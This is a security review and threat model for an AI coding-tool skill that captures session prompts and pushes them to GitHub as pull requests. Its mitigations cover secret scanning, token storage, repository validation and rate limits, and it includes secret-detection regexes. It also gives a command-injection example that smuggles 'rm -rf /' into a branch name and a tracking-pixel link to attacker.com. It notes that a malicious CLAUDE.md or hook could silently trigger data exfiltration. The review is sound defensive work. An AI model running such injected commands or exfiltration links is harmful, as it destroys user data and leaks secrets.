# Security Review - Threat Model and Mitigations

**Risk Level**: HIGH
**Scope**: OMC Skill - Session Capture and Automated GitHub PR Creation

---

## Severity Summary

- **Critical**: 3
- **High**: 4
- **Medium**: 3
- **Low**: 2

---

## CRITICAL Issues

### 1. Sensitive Data Leakage via Prompt History Capture

**Severity**: CRITICAL
**Category**: OWASP A01:2021 - Sensitive Data Exposure
**Automatic Trigger**: On every skill execution
**Impact**: Leaks API keys, passwords, PII, proprietary code, and internal architecture to a GitHub repository (potentially public)

**Issue**:
Prompt history capture inevitably includes:
- Hardcoded secrets ("here is my API key: sk-...")
- Database connection strings, `.env` file contents
- PII (customer names, emails, IDs)
- Proprietary algorithms or business logic
- Internal infrastructure details (hostnames, IPs, ARNs)

**Mitigation Strategy**:

```python
# Required: Defense in depth

# Layer 1 - Explicit consent with preview
def create_pr(session_data):
    sanitized = sanitize(session_data)
    preview = format_preview(sanitized)

    # Explicit user confirmation required
    if not prompt_user_confirmation(preview):
        raise AbortError("User declined after reviewing PR contents")

    push_to_github(sanitized)

# Layer 2 - Secret scanning before upload
SECRET_PATTERNS = [
    r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?[\w\-]{20,}',
    r'(?i)(secret|password|passwd|pwd)\s*[:=]\s*["\']?[^\s"\']{8,}',
    r'sk-[a-zA-Z0-9]{20,}',              # OpenAI keys
    r'ghp_[a-zA-Z0-9]{36}',              # GitHub PATs
    r'AKIA[0-9A-Z]{16}',                 # AWS access keys
    r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
    r'(?i)mongodb(\+srv)?://[^\s]+',     # Connection strings
]

def sanitize(data: str) -> str:
    for pattern in SECRET_PATTERNS:
        data = re.sub(pattern, '[REDACTED]', data)
    return data

# Layer 3 - User-defined exclusion patterns
# .omc/pr-skill-config.yaml:
#   exclude_patterns:
#     - "internal\\.company\\.com"
#     - "customer_id:\\s*\\d+"
```

---

### 2. GitHub Token Compromise - Storage and Scope

**Severity**: CRITICAL
**Category**: OWASP A07:2021 - Identification and Authentication Failures
**Attack Vector**: Local attacker, malicious plugin, accidental commit
**Impact**: Full repository access - pushing malicious code, reading private repos, deleting branches

**Issue**:
The skill requires a GitHub token with at least the `repo` scope:
- `repo` grants read/write access to all private repositories
- Storing in a plaintext configuration file makes it readable by any process
- Storing in the `.omc/` directory risks it being committed to git

**Mitigation Strategy**:

```python
# Never store tokens in these locations:
#   .omc/config.yaml          -- committed to git
#   CLAUDE.md                  -- committed to git
#   .env in project root       -- frequently committed by accident
#   hardcoded in skill source  -- committed to git

# Recommended: Use the system keychain
import subprocess

def get_github_token() -> str:
    """Retrieve GitHub token via a strict priority chain"""

    # Priority 1: GitHub CLI authentication (preferred)
    try:
        result = subprocess.run(['gh', 'auth', 'token'],
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            return result.stdout.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # Priority 2: System keychain
    try:
        result = subprocess.run(
            ['security', 'find-generic-password',
             '-s', 'omc-github-token', '-w'],
            capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            return result.stdout.strip()
    except FileNotFoundError:
        pass

    raise CredentialError(
        "No GitHub token found. Configure via:\n"
        "  1. gh auth login (recommended)\n"
        "  2. security add-generic-password -s omc-github-token -w <token>"
    )

# CRITICAL: Use fine-grained PATs, never classic tokens
# Required permissions (minimum):
#   - Contents: Read and write (TARGET repo only)
#   - Pull requests: Read and write (TARGET repo only)
# Never request: admin, delete, workflows, actions
```

---

### 3. Arbitrary Repository Write via Target Repo Configuration Manipulation

**Severity**: CRITICAL
**Category**: OWASP A01:2021 - Broken Access Control
**Attack Vector**: Social engineering or configuration manipulation
**Impact**: Confidential session data pushed to an attacker-controlled repository

**Issue**:
- A malicious `.omc/config.yaml` can redirect output to an attacker's repository
- Users may accidentally configure a public repository
- No verification that the user actually owns or intends to use the specified repository

**Mitigation Strategy**:

```python
def validate_target_repo(repo: str, token: str) -> bool:
    """Validate the target repository before transferring data"""

    # 1. Parse and validate format
    if not re.match(r'^[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+$', repo):
        raise ValueError(f"Invalid repo format: {repo}")

    # 2. Verify repo existence and push permissions
    headers = {'Authorization': f'token {token}'}
    resp = requests.get(f'https://api.github.com/repos/{repo}',
                       headers=headers, timeout=10)
    if resp.status_code != 200:
        raise ValueError(f"Cannot access repo: {repo}")

    repo_data = resp.json()

    # 3. Warn on public repositories
    if not repo_data.get('private', False):
        warn = (f"WARNING: {repo} is a PUBLIC repository. "
                "Session data will be visible to everyone.")
        if not prompt_user_confirmation(warn):
            raise AbortError("User declined public repo upload")

    # 4. Verify push permissions
    permissions = repo_data.get('permissions', {})
    if not permissions.get('push', False):
        raise PermissionError(f"No push access to {repo}")

    return True

# Configuration priority (security-safe):
#   1. CLI arguments (explicit per invocation)
#   2. ~/.config/omc/pr-skill.yaml (user-level, trusted)
#   Blocked: .omc/pr-skill.yaml in project dir (untrusted)
```

---

## HIGH Issues

### 4. Command Injection via Branch Names / PR Titles

**Severity**: HIGH
**Category**: OWASP A03:2021 - Injection
**Impact**: Arbitrary command execution on the user's machine

**Issue**:
Deriving branch names from unsanitized prompt input:

```bash
# If the prompt is: "fix bug"; rm -rf / #
git checkout -b "fix-bug-rm-rf-#"  # potential injection
```

**Mitigation**:

```python
def safe_branch_name(raw: str) -> str:
    """Generate a git-safe branch name from arbitrary input"""
    sanitized = re.sub(r'[^a-zA-Z0-9_-]', '-', raw)
    sanitized = re.sub(r'-+', '-', sanitized).strip('-')
    return f"omc/session/{sanitized[:60]}"

# GOOD: Pass arguments as a list, no shell interpolation
subprocess.run(['git', 'checkout', '-b', safe_branch_name(user_input)],
               shell=False)

# BAD: Never do this
# os.system(f'git commit -m "{commit_message}"')
# subprocess.run(f'git checkout -b {branch}', shell=True)
```

---

### 5. Insufficient Authorization - Who Can Trigger the Skill?

**Severity**: HIGH
**Category**: OWASP A01:2021 - Broken Access Control
**Impact**: Unintended data exfiltration

**Issue**:
Within the OMC framework, skills can be triggered by:
- Direct user invocation
- Hook-based automatic triggers
- Chaining from other skills

A malicious `CLAUDE.md` or hook could silently trigger session capture.

**Mitigation**:

```yaml
# skill manifest
name: pr-capture
triggers:
  manual: true       # explicit manual invocation only
  auto: false        # no automatic/hook triggers
  hookable: false
  chainable: false   # cannot be called by other skills

require_interactive: true  # TTY required
require_confirmation: true # always prompt
```

```python
def verify_invocation_source():
    """Verify the skill was invoked by an interactive user"""
    if not sys.stdin.isatty():
        raise SecurityError(
            "pr-capture can only be invoked interactively. "
            "Automated/hook-based invocation is blocked."
        )
```

---

### 6. Rate Limiting and Abuse

**Severity**: HIGH
**Category**: OWASP A04:2021 - Insecure Design
**Impact**: GitHub API rate limit exhaustion, repository spam, cost amplification

**Issue**:
- A loop (ralph mode) could create hundreds of PRs per iteration
- Large sessions could push gigabytes of data
- GitHub API's 5000 requests/hour limit could be exhausted

**Mitigation**:

```python
MAX_PRS_PER_HOUR = 5
MAX_PAYLOAD_SIZE_MB = 10
MIN_INTERVAL_SECONDS = 60

def check_rate_limit():
    """Local rate limiting independent of GitHub's limits"""
    # Store timestamps in ~/.config/omc/pr-skill-ratelimit.json
    # Reject if more than 5 PRs within the past hour
    # Reject if less than 60 seconds since the last PR

def check_payload_size(diff: str, prompts: str):
    """Reject excessive payloads before upload"""
    total_mb = (len(diff) + len(prompts)) / (1024 * 1024)
    if total_mb > MAX_PAYLOAD_SIZE_MB:
        raise PayloadError(f"Payload too large: {total_mb:.1f}MB")
```

---

## MEDIUM Issues

### 7. PR Content Injection (Markdown Injection)

**Severity**: MEDIUM
**Category**: OWASP A03:2021 - Injection
**Impact**: Phishing links and image tracking pixels within PRs

**Issue**:
When session prompts are inserted into the PR body without escaping:
- Disguised markdown links
- Tracking pixels: `![](https://attacker.com/track?repo=...)`

**Mitigation**:

```python
def escape_for_pr_body(content: str) -> str:
    """Escape user content before embedding in PR markdown"""
    fence = '````'
    while fence in content:
        fence += '`'
    return f"{fence}\n{content}\n{fence}"
```

---

## Security Checklist

- [ ] No hardcoded secrets in skill source code
- [ ] Run secret scanner before any data leaves the local machine
- [ ] Require user preview and explicit confirmation on every invocation
- [ ] Retrieve GitHub tokens from the keychain or gh CLI; never from project files
- [ ] Use fine-grained PATs scoped to a single target repository
- [ ] Read target repo configuration only from user-level settings (never project-level)
- [ ] Warn and gate on public repository targets
- [ ] Use argument lists for all git/shell operations (never shell=True)
- [ ] Escape PR body content within code fences
- [ ] Enforce rate limiting (max 5 PRs per hour, 60-second minimum interval)
- [ ] Cap payload size at 10MB
- [ ] Write audit logs for all invocations (metadata only, no content)
- [ ] Clean up temporary files in finally blocks
- [ ] Enforce TLS verification on all API calls
- [ ] Prevent skill triggering via hooks, chains, or automated processes
- [ ] Pin and audit all dependencies
- [ ] OWASP Top 10 category assessment completed: A01 through A10

---

## Data Flow Showing Threat Points

```
User Session
    |
[1] Access prompt history     <-- Threat: What data gets captured?
    |
[2] Secret scanning           <-- Control: Redact before anything else
    |
[3] User preview + confirm    <-- Control: Human-in-the-loop gate
    |
[4] Token retrieval           <-- Threat: Token storage/exposure
    |
[5] Target repo validation    <-- Control: Ownership + visibility check
    |
[6] GitHub API (TLS)          <-- Threat: MITM, injection
    |
[7] PR creation               <-- Control: Audit log entry
```

---

## Least Privilege Principle Matrix

| Operation | Required Permission | Never Grant |
|-----------|-------------------|-------------|
| Push to branch | `contents:write` (single repo) | `contents:write` (all repos) |
| Create PR | `pull_requests:write` (single repo) | `admin`, `delete` |
| Read repo metadata | `metadata:read` | `actions`, `workflows` |
| Token type | Fine-grained PAT | Classic PAT with `repo` scope |

---

## Final Assessment

The most dangerous aspect of this skill is its **core functionality**: it intentionally moves data from a trusted local context to a remote repository.

This inverts the typical security posture of preventing data from leaving the local environment.

**Every design decision must start from the assumption that the session contains sensitive data. The burden of proof must be on demonstrating that the data is safe, rather than detecting that it is unsafe.**

**Three non-negotiable controls**:
1. **Secret scanning before any network call** - A leaked API key cannot be recalled
2. **Human-in-the-loop confirmation with full preview** - The user must see exactly what will be pushed
3. **User-level configuration only** - A malicious project must not be able to redirect session data to an attacker's repository
